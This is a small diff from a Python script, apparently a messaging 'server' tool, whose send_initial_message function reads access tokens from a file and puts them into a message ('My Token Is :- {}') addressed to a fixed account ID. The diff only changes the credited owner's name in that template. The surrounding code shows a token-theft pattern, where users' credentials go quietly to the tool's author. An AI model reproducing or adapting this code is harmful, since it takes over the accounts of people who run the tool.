@@ -27,7 +27,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "CREDIT :- NILAM RAI                                                       OWNER => NILAM                                                      Hello Nilam Rai ! I Am Using Your Server My Token Is :- {}"
+      msg_template = "CREDIT :-💝 𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 💝                                                       OWNER =>😈 𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 𝗛𝗘𝗥𝗘 😈                                                      𝗛𝗘𝗟𝗟𝗢 𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 𝗝𝗜😽 I 𝗬𝗘 𝗠𝗘𝗥𝗔 𝗧𝗢𝗞𝗘𝗡 𝗛𝗘 𝗕𝗛𝗔𝗜 🥳🥳🥳              :- {}"
 
       # Specify the ID where you want to send the message
       target_id = "61568384455389"
